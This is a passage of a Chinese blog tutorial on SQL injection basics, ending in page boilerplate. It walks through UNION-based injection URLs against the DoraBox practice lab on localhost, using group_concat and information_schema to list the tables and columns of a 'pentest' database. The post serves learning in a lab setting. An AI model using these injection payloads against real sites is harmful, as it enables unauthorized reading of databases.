+            </figure><br>继续在语句中加<code>and和不等于前面查出的表的名字</code>：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679333657212.jpg" alt="-w989"><br><strong>我们发现这样很繁琐，如何能够让一下子全部显示出来呢，用到了<code>group_cancat()</code>函数：</strong><br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679337786295.jpg" alt="-w1028"></p>
+<p>然后我们继续去查列名，然后转到<code>infromation_schema</code>的<code>columns</code>下，一直搜索<code>account</code>下滑发现，我们在这个列表下可以拿到更全的信息：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679344981875.jpg" alt="-w1162" title>
+                </div>
+                <div class="image-caption">-w1162</div>
+            </figure>
+
+<p>去对比下<code>account</code>表下的列名信息：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679342199859.jpg" alt="-w189" title>
+                </div>
+                <div class="image-caption">-w189</div>
+            </figure>
+<p>是相对应的，所以我们可以更改下语句：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679346900575.jpg" alt="-w1012" title>
+                </div>
+                <div class="image-caption">-w1012</div>
+            </figure>
+<p>发现我们还可以拿到这个表名，对比数据库我们也可以按照表名出现的个数看出其表下有多少列。然后我们拿<code>news</code>测试下获取列名：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679349902804.jpg" alt="-w1049" title>
+                </div>
+                <div class="image-caption">-w1049</div>
+            </figure>
+
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-10-17T15:33:06.000Z" itemprop="dateUpdated">2019-10-17 23:33:06</time>
+</span><br>
+
+
+        
+        这里可以写作者留言,thank you for your reading.
+        
+    </div>
+    
+    <footer>
+        <a href="https://chumen77.github.io">
+            <img src="/img/avatar.jpg" alt="chumen77">
+            chumen77
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://chumen77.github.io/2019/09/01/SQL基础学习/&title=《SQL注入基础学习》 — Welcome to Chumen77's Blog&pic=https://chumen77.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chumen77.github.io/2019/09/01/SQL基础学习/&title=《SQL注入基础学习》 — Welcome to Chumen77's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://chumen77.github.io/2019/09/01/SQL基础学习/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SQL注入基础学习》 — Welcome to Chumen77's Blog&url=https://chumen77.github.io/2019/09/01/SQL基础学习/&via=https://chumen77.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://chumen77.github.io/2019/09/01/SQL基础学习/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/09/23/安卓程序分析环境搭建/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">安卓程序分析环境搭建</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/08/20/XSS挑战之旅/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">XSS挑战之旅</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+<section class="comments" id="comments">
+    <div id="disqus_thread"></div>
+    <script>
+    var disqus_shortname = 'true';
+    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>chumen77 &copy; 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://chumen77.github.io/2019/09/01/SQL基础学习/&title=《SQL注入基础学习》 — Welcome to Chumen77's Blog&pic=https://chumen77.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chumen77.github.io/2019/09/01/SQL基础学习/&title=《SQL注入基础学习》 — Welcome to Chumen77's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://chumen77.github.io/2019/09/01/SQL基础学习/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SQL注入基础学习》 — Welcome to Chumen77's Blog&url=https://chumen77.github.io/2019/09/01/SQL基础学习/&via=https://chumen77.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://chumen77.github.io/2019/09/01/SQL基础学习/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://chumen77.github.io/2019/09/01/SQL基础学习/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
